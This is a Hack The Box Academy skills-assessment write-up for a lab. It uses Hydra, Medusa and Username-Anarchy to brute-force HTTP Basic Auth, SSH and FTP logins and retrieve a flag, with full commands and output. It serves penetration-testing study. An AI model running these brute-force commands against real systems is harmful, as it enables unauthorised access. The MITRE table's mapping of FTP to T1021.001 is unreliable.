# Login Brute Forcing — Skills Assessment

**Platform:** Hack The Box Academy  
**Module:** Login Brute Forcing  
**Assessment:** Skills Assessment (2 Parts)  
**Difficulty:** Easy  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Technique | Tool | Outcome |
|------|-----------|------|---------|
| P1-Q1 | Basic Auth brute force | Hydra `http-get` | `admin:[redacted]` |
| P1-Q2 | Authenticated GET request | cURL `-u` | Username for Part 2 |
| P2-Q1 SSH | SSH brute force with known username | Hydra `ssh://` | `satwossh:[redacted]` |
| P2-Q1 FTP | Username generation + FTP brute force | Username-Anarchy + Medusa | `thomas:[redacted]` |
| P2-Q2 | FTP login, download flag.txt | ftp client | `HTB{flag_redacted}` |

---

## Skills Assessment Part 1

### Question 1 — Basic Auth Password

**"What is the password for the basic auth login?"**

Download the required wordlists:

```bash
Hackerpatel007_1@htb[/htb]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
Hackerpatel007_1@htb[/htb]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

Send a GET request with cURL to inspect the response headers — the `WWW-Authenticate` header confirms Basic Auth is in use:

```bash
Hackerpatel007_1@htb[/htb]$ curl -I http://10.129.85.14:35620
```

```
HTTP/1.1 401 Unauthorized
Server: nginx/1.27.1
Date: Mon, 30 Sep 2024 11:23:29 GMT
Content-Type: text/html
Content-Length: 179
Connection: keep-alive
WWW-Authenticate: Basic realm="Restricted"
```

Run Hydra with `http-get` method against the root path using both wordlists:

```bash
Hackerpatel007_1@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 10.129.85.14 http-get / -s 35620
```

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 06:25:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-get://10.129.85.14:35620/
[35620][http-get] host: 10.129.85.14   login: admin   password: [redacted]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 06:26:01
```

**Answer:** `[redacted]`

---

### Question 2 — Username for Part 2

**"After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?"**

Send an authenticated GET request using the found credentials. The username for Part 2 is embedded in a `<span>` tag in the response body:

```bash
Hackerpatel007_1@htb[/htb]$ curl http://10.129.85.14:35620 -u "admin:[redacted]" | tail
```

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   951  100   951    0     0  27649      0 --:--:-- --:--:-- --:--:-- 27970
        }
    </style>
</head>

<body>
    <h1>Congratulations!</h1>
    <p>This is the username you will need for part 2 of the Skills Assessment<span class="flag">[redacted]</span></p>
</body>

</html>
```

**Answer:** `[redacted]`

---

## Skills Assessment Part 2

### Question 1 — FTP Username via Brute Force

**"What is the username of the ftp user you find via brute-forcing?"**

Download the password wordlist:

```bash
Hackerpatel007_1@htb[/htb]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

Brute-force SSH using the username obtained from Part 1:

```bash
Hackerpatel007_1@htb[/htb]$ hydra -l satwossh -P 2023-200_most_used_passwords.txt ssh://10.129.85.14:39400
```

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 06:33:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking ssh://10.129.85.14:39400/
[39400][ssh] host: 10.129.85.14   login: satwossh   password: [redacted]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 06:34:26
```

Connect via SSH:

```bash
Hackerpatel007_1@htb[/htb]$ ssh satwossh@10.129.85.14 -p 39400
```

```
The authenticity of host '[10.129.85.14]:39400 ([10.129.85.14]:39400)' can't be established.
ED25519 key fingerprint is SHA256:0ldLAJLTwIrE2wupFhvN1WiHuimct7AF+pBddY5xIi8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.85.14]:39400' (ED25519) to the list of known hosts.
satwossh@10.129.85.14's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
```

List files and read the incident report:

```bash
Hackerpatel007_1@htb[/htb]$ ls
Hackerpatel007_1@htb[/htb]$ cat IncidentReport.txt
```

```
IncidentReport.txt  passwords.txt  username-anarchy

System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user's actions and reviewing any files uploaded to the FTP server.

Security Operations Team
```

Scan the host locally to find the FTP service:

```bash
Hackerpatel007_1@htb[/htb]$ nmap localhost
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-30 11:37 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Generate potential usernames for **Thomas Smith** using Username-Anarchy:

```bash
Hackerpatel007_1@htb[/htb]$ ./username-anarchy/username-anarchy Thomas Smith > thomas_smith.txt
```

Brute-force FTP using the generated username list and the `passwords.txt` from the home directory:

```bash
Hackerpatel007_1@htb[/htb]$ medusa -h 127.0.0.1 -U thomas_smith.txt -P passwords.txt -M ftp -t 5 | grep "ACCOUNT FOUND"
```

```
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: [redacted] Password: [redacted] [SUCCESS]
```

**Answer:** `[redacted]`

---

### Question 2 — Flag in flag.txt

**"What is the flag contained within flag.txt"**

Connect to FTP using the found credentials:

```bash
Hackerpatel007_1@htb[/htb]$ ftp ftp://thomas:[redacted]@localhost
```

```
Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp>
```

List files, download `flag.txt`, and read it:

```bash
ls
get flag.txt
!cat flag.txt
```

```
229 Entering Extended Passive Mode (|||24566|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           28 Sep 10 09:19 flag.txt
226 Directory send OK.
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||14817|)
150 Opening BINARY mode data connection for flag.txt (28 bytes).
100% |***************************************************************|    28      739.01 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (147.80 KiB/s)
HTB{flag_redacted}
```

**Answer:** `HTB{flag_redacted}`

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1110 | T1110.001 | Brute Force: Password Guessing — Hydra `http-get` against Basic Auth |
| T1110 | T1110.001 | Brute Force: Password Guessing — Hydra SSH brute force with known username |
| T1110 | T1110.001 | Brute Force: Password Guessing — Medusa FTP brute force with Username-Anarchy list |
| T1078 | T1078.003 | Valid Accounts: Local Accounts — SSH login with brute-forced credentials |
| T1021 | T1021.004 | Remote Services: SSH — lateral access into target host |
| T1021 | T1021.001 | Remote Services: FTP — FTP login to retrieve flag |
| T1083 | — | File and Directory Discovery — `ls` and `cat IncidentReport.txt` inside SSH session |
| T1046 | — | Network Service Discovery — `nmap localhost` to find FTP on port 21 |
| T1589 | T1589.003 | Gather Victim Identity Information — Username-Anarchy generating variations of Thomas Smith |

---

*Part of the HTB Academy CPTS path — Login Brute Forcing module.*  
*Penetration Tester role in India | Target: January 2027*
